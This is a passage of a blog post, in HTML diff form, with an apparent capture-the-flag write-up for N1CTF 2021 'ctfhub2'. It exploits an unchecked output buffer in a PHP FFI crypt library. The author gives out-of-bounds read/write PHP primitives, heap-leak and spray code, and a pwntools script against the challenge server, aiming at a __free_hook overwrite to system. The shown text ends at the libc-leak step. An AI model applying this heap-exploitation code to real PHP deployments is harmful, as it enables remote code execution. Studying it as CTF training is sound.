@@ -1,0 +1,185 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>N1CTF 2021 - ctfhub2 | circleous</title><link rel=stylesheet href=/css/main.min.a16339a5d57f8df4724d41efd02e48d0023feb1e3934721f39cbdc1bb1a12b31.css integrity="sha256-oWM5pdV/jfRyTUHv0C5I0AI/6x45NHIfOcvcG7GhKzE=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>N1CTF 2021 - ctfhub2</h1><time datetime=2021-11-22T00:00:00+07:00>November 22, 2021</time></header><blockquote><p>You must have noticed something pwnable in MISC-ctfhub. This time I setup ANOTHER php environment with <a href=http://crypt.so>crypt.so</a> ( you can use all the functions in ffi.inc.php too just like ctfhub ) and disable some dangerous functions. You are expected to execute /readflag and get flag. Good luck :D.</p></blockquote><h2 id=initial-analysis>Initial Analysis</h2><p>I didn&rsquo;t reverse crypt.so even until the end of the competition, but it only has 2 simple exported function,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#define FFI_LIB &#34;../crypt.so&#34;
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define FFI_SCOPE &#34;crypt&#34;
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>encrypt</span>(<span style=color:#41a6b5>void</span><span style=color:#9ece6a;font-weight:700>*</span> in,<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> size,<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>long</span> <span style=color:#41a6b5>long</span> key,<span style=color:#41a6b5>void</span><span style=color:#9ece6a;font-weight:700>*</span> out);
+</span></span><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>decrypt</span>(<span style=color:#41a6b5>void</span><span style=color:#9ece6a;font-weight:700>*</span> in,<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>int</span> size,<span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>long</span> <span style=color:#41a6b5>long</span> key,<span style=color:#41a6b5>void</span><span style=color:#9ece6a;font-weight:700>*</span> out);
+</span></span></code></pre></div><p>Design wise, you can actually see there&rsquo;s a flaw from the parameters alone. It takes 2 pointer to input and output buffer, but only take 1 size for input as parameter. This could mean output buffer length isn&rsquo;t checked. Nothing too serious, but if the one that uses the library are not careful it could leads to something unexpected. It could be ok-ish, but it shows overflow could happen if the output buffer isn&rsquo;t as big as it should be. The first step is to get to know how these 2 functions works. So, I created a small C program to test it out,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&#34;crypt.h&#34;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// https://gist.github.com/ccbrown/9722406
+</span></span></span><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>DumpHex</span>(<span style=color:#bb9af7>const</span> <span style=color:#41a6b5>void</span><span style=color:#9ece6a;font-weight:700>*</span> data, <span style=color:#41a6b5>size_t</span> size);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#define KEY 0xDEADBEEFDEADBEEFull
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#bb9af7>const</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[])
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>struct</span> {
+</span></span><span style=display:flex><span>    <span style=color:#41a6b5>char</span> buf1[<span style=color:#e0af68>0x100</span>];
+</span></span><span style=display:flex><span>    <span style=color:#41a6b5>char</span> buf2[<span style=color:#e0af68>0x100</span>];
+</span></span><span style=display:flex><span>  } stack;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(stack.buf1, <span style=color:#e0af68>0x41</span>, <span style=color:#bb9af7>sizeof</span> stack.buf1);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(stack.buf2, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span> stack.buf2);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>encrypt</span>(stack.buf1, <span style=color:#e0af68>0x100</span>, KEY, stack.buf2);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>DumpHex</span>(stack.buf2, <span style=color:#e0af68>0x100</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>and after running that code, we immediately got a crash!</p><pre><code>...
+0E0 95 B5 D1 05 E0 58 E8 2F  08 FB 7F 18 8C F6 62 2C  |  .....X./......b,
+0F0 B7 7E 36 F9 DF 99 EB FA  A3 E3 BE B5 4D 8A AD 64  |  .~6.........M..d
+*** stack smashing detected ***: terminated
+</code></pre><p>After playing around a little more with the library, I found out that every 1 plain text byte maps to 8 bytes in the encrypted buffer. So, that our output buffer that only has <code>[0x100]</code> actually far from enough and this also confirms our initial guess that overflow can occurs.</p><h2 id=overflow-in-php>Overflow in PHP…?</h2><p>This challenge expose these 2 functions with FFI in PHP, but to actually interact with it, we can only run it from the wrapper in <code>ffi.inc.php</code>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>pstr2ffi</span>(string $str){
+</span></span><span style=display:flex><span>    $len<span style=color:#9ece6a;font-weight:700>=</span>intval((strlen($str)<span style=color:#9ece6a;font-weight:700>+</span><span style=color:#e0af68>7</span>)<span style=color:#9ece6a;font-weight:700>/</span><span style=color:#e0af68>8</span>);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span>($len<span style=color:#9ece6a;font-weight:700>&gt;</span><span style=color:#e0af68>600</span>) <span style=color:#bb9af7>die</span>(<span style=color:#9ece6a>&#34;oom&#34;</span>);
+</span></span><span style=display:flex><span>    $obj<span style=color:#9ece6a;font-weight:700>=</span>FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>new</span>(<span style=color:#9ece6a>&#34;unsigned long long[&#34;</span><span style=color:#9ece6a;font-weight:700>.</span>strval($len)<span style=color:#9ece6a;font-weight:700>.</span><span style=color:#9ece6a>&#34;]&#34;</span>,<span style=color:#bb9af7>false</span>,<span style=color:#bb9af7>true</span>);
+</span></span><span style=display:flex><span>    FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>memcpy</span>($obj,$str,$len<span style=color:#9ece6a;font-weight:700>*</span><span style=color:#e0af68>8</span>);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> $obj;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>creatbuf</span>($size){
+</span></span><span style=display:flex><span>	$size<span style=color:#9ece6a;font-weight:700>=</span>intval($size);
+</span></span><span style=display:flex><span>	<span style=color:#bb9af7>if</span>($size<span style=color:#9ece6a;font-weight:700>&lt;=</span><span style=color:#e0af68>0</span>) <span style=color:#bb9af7>die</span>(<span style=color:#9ece6a>&#34;oom&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span>($size<span style=color:#9ece6a;font-weight:700>&gt;</span><span style=color:#e0af68>4800</span>) <span style=color:#bb9af7>die</span>(<span style=color:#9ece6a>&#34;oom&#34;</span>);
+</span></span><span style=display:flex><span>    $len<span style=color:#9ece6a;font-weight:700>=</span>intval(($size<span style=color:#9ece6a;font-weight:700>+</span><span style=color:#e0af68>7</span>)<span style=color:#9ece6a;font-weight:700>/</span><span style=color:#e0af68>8</span>);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>new</span>(<span style=color:#9ece6a>&#34;unsigned long long[&#34;</span><span style=color:#9ece6a;font-weight:700>.</span>strval($len)<span style=color:#9ece6a;font-weight:700>.</span><span style=color:#9ece6a>&#34;]&#34;</span>,<span style=color:#bb9af7>false</span>,<span style=color:#bb9af7>true</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>releasestr</span>($str){
+</span></span><span style=display:flex><span>    FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>free</span>($str);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>getstr</span>($x,$len){
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>string</span>($x,$len);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>encrypt_impl</span>($in,$blks,$key,$out){
+</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span>($blks<span style=color:#9ece6a;font-weight:700>&gt;</span><span style=color:#e0af68>300</span>) <span style=color:#bb9af7>die</span>(<span style=color:#9ece6a>&#34;too many data&#34;</span>);
+</span></span><span style=display:flex><span>    FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>scope</span>(<span style=color:#9ece6a>&#34;crypt&#34;</span>)<span style=color:#9ece6a;font-weight:700>-&gt;</span><span style=color:#7aa2f7>encrypt</span>($in,$blks,$key,$out);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>decrypt_impl</span>($in,$blks,$key,$out){
+</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span>($blks<span style=color:#9ece6a;font-weight:700>&gt;</span><span style=color:#e0af68>300</span>) <span style=color:#bb9af7>die</span>(<span style=color:#9ece6a>&#34;too many data&#34;</span>);
+</span></span><span style=display:flex><span>    FFI<span style=color:#9ece6a;font-weight:700>::</span><span style=color:#7aa2f7>scope</span>(<span style=color:#9ece6a>&#34;crypt&#34;</span>)<span style=color:#9ece6a;font-weight:700>-&gt;</span><span style=color:#7aa2f7>decrypt</span>($in,$blks,$key,$out);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>?&gt;</span><span style=color:#db4b4b>
+</span></span></span></code></pre></div><p>We have 4 important primitives <code>encrypt</code>, <code>decrypt</code>, <code>releasestr</code> to free a chunk, and <code>creatbuf</code> to allocate a chunk. <a href=https://www.php.net/manual/en/ffi.new.php><code>FFI::new</code></a> in <code>creatbuf</code> buffer use <code>persistent</code> flags which means that we are dealing with system heap (glibc malloc), not the internal php heap.</p><p>Since we have this overflow with encrypt/decrypt, we can create an OOB R/W primitive wrapper for this easily.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span>    $KEY <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>    $buf1 <span style=color:#9ece6a;font-weight:700>=</span> creatbuf(<span style=color:#e0af68>4800</span>);
+</span></span><span style=display:flex><span>    $buf2 <span style=color:#9ece6a;font-weight:700>=</span> creatbuf(<span style=color:#e0af68>4800</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>read</span>($chunk, $idx) {
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>global</span> $buf1, $buf2, $KEY;
+</span></span><span style=display:flex><span>        assert($idx <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>300</span>);
+</span></span><span style=display:flex><span>        encrypt_impl($chunk,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$buf1);
+</span></span><span style=display:flex><span>        decrypt_impl($buf1,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$buf2);
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> $buf2[$idx];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>function</span> <span style=color:#7aa2f7>write</span>($chunk, $idx, $val) {
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>global</span> $buf1, $buf2, $KEY;
+</span></span><span style=display:flex><span>        assert($idx <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>300</span>);
+</span></span><span style=display:flex><span>        encrypt_impl($chunk,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$buf1);
+</span></span><span style=display:flex><span>        decrypt_impl($buf1,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$buf2);
+</span></span><span style=display:flex><span>        $buf2[$idx] <span style=color:#9ece6a;font-weight:700>=</span> $val;
+</span></span><span style=display:flex><span>        encrypt_impl($buf2,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$buf1);
+</span></span><span style=display:flex><span>        decrypt_impl($buf1,$idx <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>,$KEY,$chunk);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>...</span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>?&gt;</span><span style=color:#db4b4b>
+</span></span></span></code></pre></div><p>Now, we can test it simply by take a dump of the heap and overwrite some of them.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $x <span style=color:#9ece6a;font-weight:700>=</span> [];
+</span></span><span style=display:flex><span>    array_push($x,
+</span></span><span style=display:flex><span>        creatbuf(<span style=color:#e0af68>0x11</span>), <span style=color:#414868;font-style:italic>// 0x20 sized chunks
+</span></span></span><span style=display:flex><span>        creatbuf(<span style=color:#e0af68>0x11</span>),
+</span></span><span style=display:flex><span>        creatbuf(<span style=color:#e0af68>0x11</span>),
+</span></span><span style=display:flex><span>        creatbuf(<span style=color:#e0af68>0x11</span>)
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>...</span>
+</span></span><span style=display:flex><span>    releasestr($x[<span style=color:#e0af68>1</span>]);
+</span></span><span style=display:flex><span>    releasestr($x[<span style=color:#e0af68>2</span>]);
+</span></span><span style=display:flex><span>    read($x[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>299</span>);
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> ($i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; $i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>300</span>; $i<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>echo</span> $buf2[$i] <span style=color:#9ece6a;font-weight:700>.</span> <span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>Since we have freed some chunks we can get some heap leaks from this. Thus, this challenge simply became a simple how2heap problem, because we can get libc leak with unsorted bins, overwrite fd in tcache to allocate in <code>__free_hook</code> and finally overwrite <code>__free_hook</code> to <code>system</code>, but is it really that simple?</p><h2 id=the-catch>The catch</h2><p>After creating a working shell payload in local, testing it out in remote doesn&rsquo;t even get me the correct libc leak and this is where the pain begin. We don&rsquo;t really have much options since there&rsquo;s no Docker or deployment stuff from the challenge files, the author does give some hints regarding remote env but it&rsquo;s not enough to replicate it locally. What we can do instead is create a helper to take dump of heap layout (because we can get the output from remote) and here&rsquo;s the script for that.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
+</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>subprocess</span> <span style=color:#7dcfff>import</span> check_output
+</span></span><span style=display:flex><span><span style=color:#7dcfff>import</span> <span style=color:#e0af68>ctypes</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#9ece6a;font-weight:700>=</span> remote(<span style=color:#9ece6a>&#34;43.129.202.109&#34;</span>, <span style=color:#e0af68>47010</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>buf <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>suffix, target <span style=color:#9ece6a;font-weight:700>=</span> re<span style=color:#9ece6a;font-weight:700>.</span>findall(<span style=color:#9d7cd8>r</span><span style=color:#9ece6a>&#39;sha256\(XXXX\+(\w+)\) == (\w+)&#39;</span>, buf<span style=color:#9ece6a;font-weight:700>.</span>decode())[<span style=color:#e0af68>0</span>]
+</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;&gt;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, check_output([<span style=color:#9ece6a>&#34;./pow&#34;</span>, suffix, target])<span style=color:#9ece6a;font-weight:700>.</span>strip())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>with</span> <span style=color:#9ece6a>open</span>(<span style=color:#9ece6a>&#34;hax.php&#34;</span>, <span style=color:#9ece6a>&#34;rb&#34;</span>) <span style=color:#bb9af7>as</span> f:
+</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;&gt; </span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, b64e(f<span style=color:#9ece6a;font-weight:700>.</span>read())<span style=color:#9ece6a;font-weight:700>.</span>encode())
+</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>while</span> <span style=color:#e0af68>True</span>:
+</span></span><span style=display:flex><span>    command <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> command <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;DONE&#34;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>break</span>
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>elif</span> command <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;START&#34;</span>:
+</span></span><span style=display:flex><span>        dump <span style=color:#9ece6a;font-weight:700>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>while</span> <span style=color:#e0af68>True</span>:
+</span></span><span style=display:flex><span>            buf <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>            <span style=color:#bb9af7>if</span> buf <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;END&#34;</span>:
+</span></span><span style=display:flex><span>                <span style=color:#bb9af7>break</span>
+</span></span><span style=display:flex><span>            b <span style=color:#9ece6a;font-weight:700>=</span> ctypes<span style=color:#9ece6a;font-weight:700>.</span>c_uint64(<span style=color:#9ece6a>int</span>(buf))<span style=color:#9ece6a;font-weight:700>.</span>value
+</span></span><span style=display:flex><span>            dump<span style=color:#9ece6a;font-weight:700>.</span>append(b)
+</span></span><span style=display:flex><span>        <span style=color:#bb9af7>for</span> i <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a>len</span>(dump), <span style=color:#e0af68>2</span>):
+</span></span><span style=display:flex><span>            <span style=color:#bb9af7>if</span> i <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span> <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a>len</span>(dump):
+</span></span><span style=display:flex><span>                <span style=color:#9ece6a>print</span>(<span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;</span><span style=color:#9ece6a>{</span>i <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span><span style=color:#9ece6a>:</span><span style=color:#9ece6a>03X</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a> 0x</span><span style=color:#9ece6a>{</span>dump[i]<span style=color:#9ece6a>:</span><span style=color:#9ece6a>016X</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#bb9af7>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#9ece6a>print</span>(<span style=color:#9d7cd8>f</span><span style=color:#9ece6a>&#34;</span><span style=color:#9ece6a>{</span>i <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span><span style=color:#9ece6a>:</span><span style=color:#9ece6a>03X</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a> 0x</span><span style=color:#9ece6a>{</span>dump[i]<span style=color:#9ece6a>:</span><span style=color:#9ece6a>016X</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a> 0x</span><span style=color:#9ece6a>{</span>dump[i<span style=color:#9ece6a;font-weight:700>+</span><span style=color:#e0af68>1</span>]<span style=color:#9ece6a>:</span><span style=color:#9ece6a>016X</span><span style=color:#9ece6a>}</span><span style=color:#9ece6a>&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#9ece6a>print</span>(<span style=color:#9ece6a>&#34; ================================= &#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#9ece6a>print</span>(command<span style=color:#9ece6a;font-weight:700>.</span>decode())
+</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>interactive()
+</span></span></code></pre></div><p>This really helps A LOT when taking a dump of heap layout. First we need to mark our chunks with a recognize-able pattern and start heap dump with <code>START\n</code> and end it with <code>END\n</code>, the python script will be the one in charge to make it looks nicer.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$x <span style=color:#9ece6a;font-weight:700>=</span> [];
+</span></span><span style=display:flex><span>array_push($x,
+</span></span><span style=display:flex><span>    creatbuf(<span style=color:#e0af68>0x11</span>),
+</span></span><span style=display:flex><span>    creatbuf(<span style=color:#e0af68>0x11</span>),
+</span></span><span style=display:flex><span>    creatbuf(<span style=color:#e0af68>0x11</span>),
+</span></span><span style=display:flex><span>    creatbuf(<span style=color:#e0af68>0x11</span>)
+</span></span><span style=display:flex><span>);
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>...</span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>for</span> ($i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; $i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>4</span>; $i<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>    $x[$i][<span style=color:#e0af68>0</span>] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x333333333333</span>; <span style=color:#414868;font-style:italic>// recognizeable pattern
+</span></span></span><span style=display:flex><span>    $x[$i][<span style=color:#e0af68>1</span>] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x333333333333</span>;
+</span></span><span style=display:flex><span>    $x[$i][<span style=color:#e0af68>2</span>] <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0x333333333333</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>releasestr($x[<span style=color:#e0af68>1</span>]);
+</span></span><span style=display:flex><span>releasestr($x[<span style=color:#e0af68>2</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>read($x[<span style=color:#e0af68>0</span>], <span style=color:#e0af68>299</span>);
+</span></span><span style=display:flex><span><span style=color:#bb9af7>echo</span> <span style=color:#9ece6a>&#34;START</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#bb9af7>for</span> ($i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; $i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>300</span>; $i<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#bb9af7>echo</span> $buf2[$i] <span style=color:#9ece6a;font-weight:700>.</span> <span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>echo</span> <span style=color:#9ece6a>&#34;END</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span></code></pre></div><p>The output,</p><pre><code>000 0x0000333333333333 0x0000333333333333 // x[0]
+010 0x0000333333333333 0x00000000000000F1
+020 0x00005570AB328520 0x00005570AB2F9010
+...
+550 0x0000000000656761 0x0000000000000021 // x[1]
+560 0x0000000000000000 0x00005570AB2F9010
+570 0x0000333333333333 0x00000000000000D1
+...
+6D0 0x0000007265707075 0x0000000000000021 // x[2]
+6E0 0x00005570AB32B990 0x00005570AB2F9010
+6F0 0x0000333333333333 0x00000000000000D1
+</code></pre><p>and for getting libc leak, I just sprayed some huge-ish chunks and freed them. Just hope that some of the libc leaks remains near our controlled chunks. To find them just find a leak starting with 0x7F and ends with …BE0 (Ubuntu 20.04, libc 2.31)</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$bigly <span style=color:#9ece6a;font-weight:700>=</span> [];
+</span></span><span style=display:flex><span><span style=color:#bb9af7>for</span> ($i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>; $i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>16</span>; $i<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>    array_push($bigly, creatbuf(<span style=color:#e0af68>0x1a0</span>));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#bb9af7>for</span> ($i <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>2</span>; $i <span style=color:#9ece6a;font-weight:700>&lt;</span> <span style=color:#e0af68>16</span>; $i<span style=color:#9ece6a;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>    releasestr($bigly[$i]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>....</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>read($bigly[<span style=color:#e0af68>1</span>], <span style=color:#e0af68>77</span>); <span style=color:#414868;font-style:italic>// libc leak
